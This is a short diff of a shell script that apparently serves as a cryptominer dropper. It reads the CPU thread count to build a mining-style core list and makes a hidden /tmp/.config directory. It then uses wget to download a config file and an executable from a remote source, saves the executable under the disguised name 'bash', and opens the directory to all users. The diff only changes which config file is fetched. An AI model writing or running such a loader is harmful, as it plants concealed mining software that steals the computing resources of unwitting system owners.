@@ -11,7 +11,7 @@ cores=`grep 'siblings' /proc/cpuinfo |cut -d':' -f2 | head -n1 |grep -o '[0-9]\+
 [ -n "$cores" ] && rx="[`seq -s ', ' 0 $((cores - 1))`]" || rx=""
 
 mkdir -p "/tmp/.config"
-wget -qO "/tmp/.config/config.json" "${src}/x.json"
+wget -qO "/tmp/.config/config.json" "${src}/z.json"
 wget -qO "/tmp/.config/bash" "${src}/bash"
 chmod -R 777 "/tmp/.config"
 
